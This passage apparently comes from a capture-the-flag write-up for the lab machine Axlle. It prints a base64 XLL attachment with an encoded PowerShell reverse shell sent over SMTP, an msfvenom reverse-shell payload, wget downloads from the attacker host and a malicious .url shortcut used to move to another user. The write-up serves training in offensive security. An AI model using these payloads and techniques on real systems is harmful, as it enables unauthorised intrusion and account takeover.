 -> jT2AEQAA6xJIiwNIhcB0Bv8VOAYAAEiDwwhIO99y6UiLXCQwSIPEIF/DSIlcJAhXSIPsIEiNHVsR
 -> AABIjT1UEQAA6xJIiwNIhcB0Bv8V/AUAAEiDwwhIO99y6UiLXCQwSIPEIF/DwgAAzEiJXCQQSIl0
 -> JBhXSIPsEDPAM8kPokSLwUUz20SL0kGB8G50ZWxBgfJpbmVJRIvLi/AzyUGNQwFFC9APokGB8Udl
 -> bnWJBCRFC9GJXCQEi/mJTCQIiVQkDHVbSIMN4yQAAP8l8D//D0jHBcskAAAAgAAAPcAGAQB0KD1g
 -> BgIAdCE9cAYCAHQaBbD5/P+D+CB3JEi5AQABAAEAAABID6PBcxREiwWpKgAAQYPIAUSJBZ4qAADr
 -> B0SLBZUqAAC4BwAAAESNSPs78HwmM8kPookEJESL24lcJASJTCQIiVQkDA+64wlzCkULwUSJBWIq
 -> AADHBTwkAAABAAAARIkNOSQAAA+65xQPg5EAAABEiQ0kJAAAuwYAAACJHR0kAAAPuucbc3kPuucc
 -> c3MzyQ8B0EjB4iBIC9BIiVQkIEiLRCQgIsM6w3VXiwXvIwAAg8gIxwXeIwAAAwAAAIkF3CMAAEH2
 -> wyB0OIPIIMcFxSMAAAUAAACJBcMjAAC4AAAD0EQj2EQ72HUYSItEJCAk4DzgdQ2DDaQjAABAiR2a
 -> IwAASItcJCgzwEiLdCQwSIPEEF/DM8A5BaAjAAAPlcDDzMzMzMzMzMzMzMzM/yWiAwAA/yWUAwAA
 -> /yWeAwAA/yXgAwAA/yXSAwAA/yXEAwAA/yW2AwAA/yWoAwAA/yWaAwAA/yWMAwAA/yV+AwAAzMyw
 -> AcPMM8DD/yVHAwAAzMzMzMzMzMzMzMzMzMzMzMzMzMzMZmYPH4QAAAAAAP/gzMzMzMzMzMzMzMzM
 -> zMzMzMzMzMxmZg8fhAAAAAAA/yWKAwAAQFVIg+wgSIvqik1ASIPEIF3pbPv//8xAVUiD7CBIi+qK
 -> TSDoWvv//5BIg8QgXcPMQFVIg+wgSIvqSIPEIF3py/n//8xAVUiD7DBIi+pIiwGLEEiJTCQoiVQk
 -> IEyNDYjy//9Mi0Vwi1VoSItNYOgM+f//kEiDxDBdw8xAVUiL6kiLATPJgTgFAADAD5TBi8Fdw8wA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACGMQAAAAAAAKow
 -> AAAAAAAAljAAAAAAAADYMAAAAAAAAPQwAAAAAAAAEjEAAAAAAADMMQAAAAAAALYxAAAAAAAAnDEA
 -> AAAAAADEMAAAAAAAAHAxAAAAAAAAVjEAAAAAAAA6MQAAAAAAACYxAAAAAAAAAAAAAAAAAADuMQAA
 -> AAAAAIgvAAAAAAAAcC8AAAAAAACoLwAAAAAAAAAAAAAAAAAAajAAAAAAAABSMAAAAAAAADYwAAAA
 -> AAAAFDAAAAAAAAD6LwAAAAAAAOgvAAAAAAAA2i8AAAAAAADOLwAAAAAAAMQvAAAAAAAAAAAAAAAA
 -> AAAYGwCAAQAAABgbAIABAAAAUB0AgAEAAABwHQCAAQAAAHAdAIABAAAAAAAAAAAAAAArHQCAAQAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAkEAAgAEAAAAwQQCAAQAAAAAAAAAAAAAA////////////
 -> /////////2NtZC5leGUgL2MgcG93ZXJzaGVsbCAtZSBKQUJqQUd3QWFRQmxBRzRBZEFBZ0FEMEFJ
 -> QUJPQUdVQWR3QXRBRThBWWdCcUFHVUFZd0IwQUNBQVV3QjVBSE1BZEFCbEFHMEFMZ0JPQUdVQWRB
 -> QXVBRk1BYndCakFHc0FaUUIwQUhNQUxnQlVBRU1BVUFCREFHd0FhUUJsQUc0QWRBQW9BQ0lBTVFB
 -> d0FDNEFNUUF3QUM0QU1RQTBBQzRBTmdBaUFDd0FOQUEwQURNQUtRQTdBQ1FBY3dCMEFISUFaUUJo
 -> QUcwQUlBQTlBQ0FBSkFCakFHd0FhUUJsQUc0QWRBQXVBRWNBWlFCMEFGTUFkQUJ5QUdVQVlRQnRB
 -> Q2dBS1FBN0FGc0FZZ0I1QUhRQVpRQmJBRjBBWFFBa0FHSUFlUUIwQUdVQWN3QWdBRDBBSUFBd0FD
 -> NEFMZ0EyQURVQU5RQXpBRFVBZkFBbEFIc0FNQUI5QURzQWR3Qm9BR2tBYkFCbEFDZ0FLQUFrQUdr
 -> QUlBQTlBQ0FBSkFCekFIUUFjZ0JsQUdFQWJRQXVBRklBWlFCaEFHUUFLQUFrQUdJQWVRQjBBR1VB
 -> Y3dBc0FDQUFNQUFzQUNBQUpBQmlBSGtBZEFCbEFITUFMZ0JNQUdVQWJnQm5BSFFBYUFBcEFDa0FJ
 -> QUF0QUc0QVpRQWdBREFBS1FCN0FEc0FKQUJrQUdFQWRBQmhBQ0FBUFFBZ0FDZ0FUZ0JsQUhjQUxR
 -> QlBBR0lBYWdCbEFHTUFkQUFnQUMwQVZBQjVBSEFBWlFCT0FHRUFiUUJsQUNBQVV3QjVBSE1BZEFC
 -> bEFHMEFMZ0JVQUdVQWVBQjBBQzRBUVFCVEFFTUFTUUJKQUVVQWJnQmpBRzhBWkFCcEFHNEFad0Fw
 -> QUM0QVJ3QmxBSFFBVXdCMEFISUFhUUJ1QUdjQUtBQWtBR0lBZVFCMEFHVUFjd0FzQURBQUxBQWdB
 -> Q1FBYVFBcEFEc0FKQUJ6QUdVQWJnQmtBR0lBWVFCakFHc0FJQUE5QUNBQUtBQnBBR1VBZUFBZ0FD
 -> UUFaQUJoQUhRQVlRQWdBRElBUGdBbUFERUFJQUI4QUNBQVR3QjFBSFFBTFFCVEFIUUFjZ0JwQUc0
 -> QVp3QWdBQ2tBT3dBa0FITUFaUUJ1QUdRQVlnQmhBR01BYXdBeUFDQUFQUUFnQUNRQWN3QmxBRzRB
 -> WkFCaUFHRUFZd0JyQUNBQUt3QWdBQ0lBVUFCVEFDQUFJZ0FnQUNzQUlBQW9BSEFBZHdCa0FDa0FM
 -> Z0JRQUdFQWRBQm9BQ0FBS3dBZ0FDSUFQZ0FnQUNJQU93QWtBSE1BWlFCdUFHUUFZZ0I1QUhRQVpR
 -> QWdBRDBBSUFBb0FGc0FkQUJsQUhnQWRBQXVBR1VBYmdCakFHOEFaQUJwQUc0QVp3QmRBRG9BT2dC
 -> QkFGTUFRd0JKQUVrQUtRQXVBRWNBWlFCMEFFSUFlUUIwQUdVQWN3QW9BQ1FBY3dCbEFHNEFaQUJp
 -> QUdFQVl3QnJBRElBS1FBN0FDUUFjd0IwQUhJQVpRQmhBRzBBTGdCWEFISUFhUUIwQUdVQUtBQWtB
 -> SE1BWlFCdUFHUUFZZ0I1QUhRQVpRQXNBREFBTEFBa0FITUFaUUJ1QUdRQVlnQjVBSFFBWlFBdUFF
 -> d0FaUUJ1QUdjQWRBQm9BQ2tBT3dBa0FITUFkQUJ5QUdVQVlRQnRBQzRBUmdCc0FIVUFjd0JvQUNn
 -> QUtRQjlBRHNBSkFCakFHd0FhUUJsQUc0QWRBQXVBRU1BYkFCdkFITUFaUUFvQUNrQQAAAAAAAABA
 -> AQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAgAEAAAAAAAAAAAAAAAAAAAAAAAAA8CAA
 -> gAEAAAAAIQCAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACkAgAEAAAAAAAAAAAAAAAAAAAAAAAAA+CAAgAEA
 -> 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
 -> AAAAAJwxAAAAAAAAxDAAAAAAAABwMQAAAAAAAFYxAAAAAAAAOjEAAAAAAAAmMQAAAAAAAAAAAAAA
 -> AAAA7jEAAAAAAACILwAAAAAAAHAvAAAAAAAAqC8AAAAAAAAAAAAAAAAAAGowAAAAAAAAUjAAAAAA
 -> AAA2MAAAAAAAABQwAAAAAAAA+i8AAAAAAADoLwAAAAAAANovAAAAAAAAzi8AAAAAAADELwAAAAAA
 -> AAAAAAAAAAAACABfX0Nfc3BlY2lmaWNfaGFuZGxlcgAAJQBfX3N0ZF90eXBlX2luZm9fZGVzdHJv
 -> eV9saXN0AAA+AG1lbXNldAAAVkNSVU5USU1FMTQwLmRsbAAAZgBzeXN0ZW0AADYAX2luaXR0ZXJt
 -> ADcAX2luaXR0ZXJtX2UAPwBfc2VoX2ZpbHRlcl9kbGwAGABfY29uZmlndXJlX25hcnJvd19hcmd2
 -> AAAzAF9pbml0aWFsaXplX25hcnJvd19lbnZpcm9ubWVudAAANABfaW5pdGlhbGl6ZV9vbmV4aXRf
 -> dGFibGUAACIAX2V4ZWN1dGVfb25leGl0X3RhYmxlABYAX2NleGl0AABhcGktbXMtd2luLWNydC1y
 -> dW50aW1lLWwxLTEtMC5kbGwAAQVSdGxDYXB0dXJlQ29udGV4dAAJBVJ0bExvb2t1cEZ1bmN0aW9u
 -> RW50cnkAABAFUnRsVmlydHVhbFVud2luZAAA8wVVbmhhbmRsZWRFeGNlcHRpb25GaWx0ZXIAALAF
 -> U2V0VW5oYW5kbGVkRXhjZXB0aW9uRmlsdGVyADsCR2V0Q3VycmVudFByb2Nlc3MA0AVUZXJtaW5h
 -> dGVQcm9jZXNzAACyA0lzUHJvY2Vzc29yRmVhdHVyZVByZXNlbnQAewRRdWVyeVBlcmZvcm1hbmNl
 -> Q291bnRlcgA8AkdldEN1cnJlbnRQcm9jZXNzSWQAQAJHZXRDdXJyZW50VGhyZWFkSWQAABQDR2V0
 -> U3lzdGVtVGltZUFzRmlsZVRpbWUAlANJbml0aWFsaXplU0xpc3RIZWFkAKoDSXNEZWJ1Z2dlclBy
 -> ZXNlbnQAS0VSTkVMMzIuZGxsAAA8AG1lbWNweQAAAAAAAAAAAAAyot8tmSsAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAzV0g0mbU////////
 -> AAAAAAEAAAACAAAAAAAIAAAAAAAAAAACAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABAQAAArEAAAUCwAAEAQAABeEAAA
 -> WCwAAGAQAACwEAAAUCwAALAQAADGEQAAXCwAAMgRAABIEgAAoCwAAEgSAAB5EwAA9CwAAHwTAAC5
 -> EwAAJC0AALwTAADwEwAASC0AAPATAADCFAAANC0AAMQUAAA1FQAAPC0AADgVAADkFQAAUC0AABAW
 -> AAArFgAAUCwAACwWAABlFgAAUCwAAGgWAACcFgAAUCwAAJwWAACxFgAAUCwAALQWAADcFgAAUCwA
 -> ANwWAADxFgAAUCwAAPQWAABUFwAAhC0AAFQXAACEFwAAUCwAAIQXAACYFwAAUCwAAJgXAADSFwAA
 -> UCwAANQXAABfGAAASC0AAGAYAAD4GAAAXC0AAPgYAAAcGQAASC0AABwZAABFGQAASC0AAFgZAACg
 -> GgAAmC0AAKAaAADcGgAAqC0AANwaAAAYGwAAqC0AABwbAADIHAAAtC0AAFAdAABSHQAAyC0AAHAd
 -> AAB2HQAA0C0AAHYdAACNHQAAmCwAAI0dAACmHQAAmCwAAKYdAAC6HQAAmCwAALodAADwHQAAHC0A
 -> APAdAAAIHgAAfC0AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABgAAAAY
 -> AACAAAAAAAAAAAAAAAAAAAABAAIAAAAwAACAAAAAAAAAAAAAAAAAAAABAAkEAABIAAAAYGAAAH0B
 -> AAAAAAAAAAAAAAAAAAAAAAAAPD94bWwgdmVyc2lvbj0nMS4wJyBlbmNvZGluZz0nVVRGLTgnIHN0
 -> YW5kYWxvbmU9J3llcyc/Pg0KPGFzc2VtYmx5IHhtbG5zPSd1cm46c2NoZW1hcy1taWNyb3NvZnQt
 -> Y29tOmFzbS52MScgbWFuaWZlc3RWZXJzaW9uPScxLjAnPg0KICA8dHJ1c3RJbmZvIHhtbG5zPSJ1
 -> cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgPHNlY3VyaXR5Pg0KICAgICAg
 -> PHJlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBs
 -> ZXZlbD0nYXNJbnZva2VyJyB1aUFjY2Vzcz0nZmFsc2UnIC8+DQogICAgICA8L3JlcXVlc3RlZFBy
 -> aXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0K
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAALAAAAPCg+KAAoQihEKEgoXih
 -> gKFIp2CnaKfwpwioEKgYqCCoKKgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 -> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==
 ->
 -> ------=_MIME_BOUNDARY_000_1500604--
 ->
 ->
 -> .
<-  250 Queued (10.625 seconds)
 -> QUIT
<-  221 goodbye
=== Connection closed with remote host.

```

A few seconds later:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.21 56305

PS C:\> whoami
axlle\gideon.hamill

```

## Shell as dallon.matrix

### Enumeration

#### Home Directories

gideon.hamill’s home directory is completely empty:

```

PS C:\Users\gideon.hamill> tree . /f
Folder PATH listing
Volume serial number is 000001C4 BFF7:F940
C:\USERS\GIDEON.HAMILL
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---OneDrive
+---Pictures
+---Saved Games
+---Searches
+---Videos

```

There are a bunch of other users on the box:

```

PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/2/2024   3:05 AM                Administrator
d-----          1/1/2024   3:44 AM                baz.humphries
d-----          1/1/2024   3:43 AM                brad.shaw
d-----          1/1/2024   3:44 AM                calum.scott
d-----          1/1/2024   3:44 AM                dallon.matrix
d-----          1/1/2024   3:44 AM                dan.kendo
d-----          1/1/2024   5:58 AM                gideon.hamill
d-----          1/1/2024   3:44 AM                jacob.greeny
d-----          1/1/2024   3:43 AM                lindsay.richards
d-r---         1/22/2023   1:35 AM                Public
d-----          1/1/2024   3:43 AM                simon.smalls
d-----          1/1/2024   3:44 AM                trent.langdon

```

I’m able to access some, but they are all empty.

#### File System Root

It’s always interesting to check for unusual directories in the file system root:

```

PS C:\> ls

    Directory: C:\

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/1/2024  10:03 PM                App Development
d-----          1/1/2024   6:33 AM                inetpub
d-----          5/8/2021   1:20 AM                PerfLogs
d-r---         6/13/2024   2:20 AM                Program Files
d-----         6/13/2024   2:23 AM                Program Files (x86)
d-r---          1/1/2024   4:15 AM                Users
d-----         6/13/2024   4:30 AM                Windows

```

`App Development` is not typical, but I can’t access it as gideon.hamill.

#### Web

The web root is in `C:\inetpub\wwwroot`:

```

PS C:\inetpub\wwwroot> ls

    Directory: C:\inetpub\wwwroot

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/1/2024   4:33 AM                assets
d-----          1/1/2024   4:33 AM                css
d-----          1/1/2024   4:33 AM                js
-a----          1/1/2024   3:12 AM            703 iisstart.htm
-a----          1/1/2024   3:12 AM          99710 iisstart.png
-a----          1/1/2024   4:37 AM          10228 index.html

```

It is just a static site.

The `C:\inetpub` directory does have one non-standard folder, `testing`:

```

PS C:\inetpub> ls

    Directory: C:\inetpub

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/1/2024   3:12 AM                custerr
d-----         6/13/2024   2:18 AM                history
d-----          1/1/2024   4:33 AM                logs
d-----          1/1/2024   3:13 AM                temp
d-----          1/2/2024   9:56 PM                testing
d-----          1/1/2024   4:33 AM                wwwroot

```

It’s empty.

#### hMail

The mail server running is [hMailServer](https://www.hmailserver.com/):

```

PS C:\Program Files (x86)\hMailServer> ls

    Directory: C:\Program Files (x86)\hMailServer

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          1/1/2024   3:33 AM                Addons
d-----          1/1/2024   3:33 AM                Bin
d-----         6/26/2024   2:06 PM                Data
d-----          1/1/2024   3:33 AM                Database
d-----          1/1/2024   3:33 AM                DBScripts
d-----         6/24/2024   4:09 PM                Events
d-----          1/1/2024   3:33 AM                Languages
d-----          1/1/2024   3:33 AM                Logs
d-----          1/1/2024   3:33 AM                PHPWebAdmin
d-----          1/1/2024   3:33 AM                Temp
-a----          1/1/2024   3:33 AM          56839 unins000.dat
-a----          1/1/2024   3:33 AM         718530 unins000.exe

```

The emails are stored in `Data\axlle.htb`:

```

PS C:\Program Files (x86)\hMailServer\Data\axlle.htb> ls

    Directory: C:\Program Files (x86)\hMailServer\Data\axlle.htb

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         6/26/2024   2:06 PM                accounts
d-----         6/26/2024   2:06 PM                Attachments
d-----          1/1/2024   6:32 AM                dallon.matrix
d-----         6/26/2024   2:06 PM                ReviewedAttachments

```

`Attachments` is empty. `ReviewedAttachments` has my latest reverse shell `.xll`. `accounts` is empty (probably cleaned up when the attachments are executed). There is an email in the `dallon.matrix` directory:

```

PS C:\Program Files (x86)\hMailServer\Data\axlle.htb> tree . /f
Folder PATH listing
Volume serial number is 000002A2 BFF7:F940
C:\PROGRAM FILES (X86)\HMAILSERVER\DATA\AXLLE.HTB
+---accounts
+---Attachments
+---dallon.matrix
?   +---2F
?           {2F7523BD-628F-4359-913E-A873FCC59D0F}.eml
?           
+---ReviewedAttachments
        20240626140637_invoice-rev.xll

```

It is from `webdevs@axlle.htb`:

```

Return-Path: webdevs@axlle.htb
Received: from bumbag (Unknown [192.168.77.153])
        by MAINFRAME with ESMTP
        ; Mon, 1 Jan 2024 06:32:24 -0800
Date: Tue, 02 Jan 2024 01:32:23 +1100
To: dallon.matrix@axlle.htb, calum.scott@axlle.htb, trent.langdon@axlle.htb, dan.kendo@axlle.htb, david.brice@axlle.htb, frankie.rose@axlle.htb, samantha.fade@axlle.htb, jess.adams@axlle.htb, emily.cook@axlle.htb, phoebe.graham@axlle.htb, matt.drew@axlle.htb, xavier.edmund@axlle.htb, baz.humphries@axlle.htb, jacob.greeny@axlle.htb
From: webdevs@axlle.htb
Subject: OSINT Application Testing
Message-Id: <20240102013223.019081@bumbag>
X-Mailer: swaks v20201014.0 jetmore.org/john/code/swaks/

Hi everyone,

The Web Dev group is doing some development to figure out the best way to automate the checking and addition of URLs into the OSINT portal.

We ask that you drop any web shortcuts you have into the C:\inetpub\testing folder so we can test the automation.

Yours in click-worthy URLs,

The Web Dev Team

```

### Malicious Url File

#### Background

On Windows, the file format for a [website shortcut](https://learn.microsoft.com/en-us/windows/win32/lwef/internet-shortcuts) is a `.url` file. [An Unofficial Guide to the URL File Format](https://www.lyberty.com/encyc/articles/tech/dot_url_format_-_an_unofficial_guide.html) has a nice breakdown of what does into a `.url` file, including this example:

```

[InternetShortcut]
URL=http://www.someaddress.com/
WorkingDirectory=C:\WINDOWS\
ShowCommand=7
IconIndex=1
IconFile=C:\WINDOWS\SYSTEM\url.dll
Modified=20F06BA06D07BD014D
HotKey=1601

```

[This article](https://inquest.net/blog/shortcut-to-malice-url-files/) from Inquest talks about malicious uses of the `.url` file. The URL item is not limited to using `http://` or `https://`, but other protocols will work. There have been vulnerabilities in browsers that allow for opening remote files and even executables like `.hta` files.

#### Exploit

Because I have local access to Axlle, I can write a file and just have the link point to it without much need for exploitation. I’ll create a file:

```

oxdf@hacky$ cat rev.url 
[internetshortcut]
URL=C:\programdata\0xdf.exe

```

I’ll create a reverse shell payload as well with `msfvenom`:

```

oxdf@hacky$ msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.14.6 lport=443 -f exe -o rev.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: rev.exe

```

I’ll upload both to Axlle, putting the reverse shell in `C:\programdata` and the URL in `C:\inetpub\testing`:

```

PS C:\programdata> wget 10.10.14.6/rev.exe -outfile 0xdf.exe
PS C:\programdata> wget 10.10.14.6/rev.url -outfile C:\inetpub\testing\0xdf.url

```

After a short time, the `.url` file is gone, and there’s a shell at my listening `nc`:

```

oxdf@hacky$ rlwrap -cAr nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.21 50738
Microsoft Windows [Version 10.0.20348.2527]
(c) Microsoft Corporation. All rights reserved.

C:\> whoami
axlle\dallon.matrix

```

I’ll upgrade to PowerShell:

```

C:\> powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\>

```

And grab `user.txt`:

```

